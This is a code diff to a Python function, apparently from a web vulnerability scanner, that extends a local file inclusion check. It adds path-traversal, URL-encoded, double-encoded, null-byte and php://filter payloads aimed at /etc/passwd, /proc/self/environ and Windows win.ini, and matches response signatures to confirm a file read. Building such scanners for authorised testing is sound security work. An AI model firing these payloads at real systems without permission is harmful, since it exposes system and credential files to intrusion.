@@ -198,19 +198,44 @@ def verify_sqli(url: str, param: str, method: str, cookie: str) -> tuple[bool, s
 
 def verify_lfi(url: str, param: str, method: str, cookie: str) -> tuple[bool, str]:
     """Local/Remote file read: try classic traversal + php filter wrappers, confirm by the
-    /etc/passwd root line signature."""
-    payloads = ["/etc/passwd", "../../../../../../etc/passwd",
-                "....//....//....//....//etc/passwd",
-                "php://filter/convert.base64-encode/resource=/etc/passwd"]
+    /etc/passwd root line signature (also Windows win.ini + base64/wrapper variants)."""
+    payloads = [
+        # *nix traversal (varying depth) + absolute
+        "/etc/passwd", "../etc/passwd", "../../../../../../etc/passwd",
+        "../../../../../../../../../../etc/passwd",
+        # traversal-filter bypasses
+        "....//....//....//....//....//etc/passwd",
+        "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",           # url-encoded
+        "..%252f..%252f..%252f..%252f..%252fetc%252fpasswd",    # double-encoded
+        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+        # null-byte / extension-append bypasses (legacy PHP)
+        "/etc/passwd%00", "../../../../../../etc/passwd%00.html",
+        # php wrappers
+        "php://filter/convert.base64-encode/resource=/etc/passwd",
+        "php://filter/read=convert.base64-encode/resource=/etc/passwd",
+        "php://filter/resource=/etc/passwd",
+        # other readable *nix files
+        "/proc/self/environ", "/etc/hostname",
+        # Windows
+        "..\\..\\..\\..\\..\\..\\windows\\win.ini",
+        "../../../../../../windows/win.ini",
+        "c:\\windows\\win.ini",
+        "..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini",
+    ]
     for p in payloads:
         try:
             r = _req(method, url, param, p, cookie)
         except Exception:  # noqa: BLE001, S112
             continue
-        if "root:x:0:0" in r.text:
+        t = r.text
+        if "root:x:0:0" in t:
             return True, f"read /etc/passwd via {p!r}"
-        if "cm9vdDp4OjA6MDp" in r.text:  # base64 of 'root:x:0:0:'
+        if "cm9vdDp4OjA6MDp" in t:                    # base64 of 'root:x:0:0:'
             return True, f"read /etc/passwd (base64 filter) via {p!r}"
+        if "[extensions]" in t.lower() or "[fonts]" in t.lower() or "for 16-bit app support" in t.lower():
+            return True, f"read Windows win.ini via {p!r}"
+        if "DOCUMENT_ROOT=" in t or "HTTP_USER_AGENT=" in t:  # /proc/self/environ
+            return True, f"read /proc/self/environ via {p!r}"
     return False, "no file-read signature"
 
 
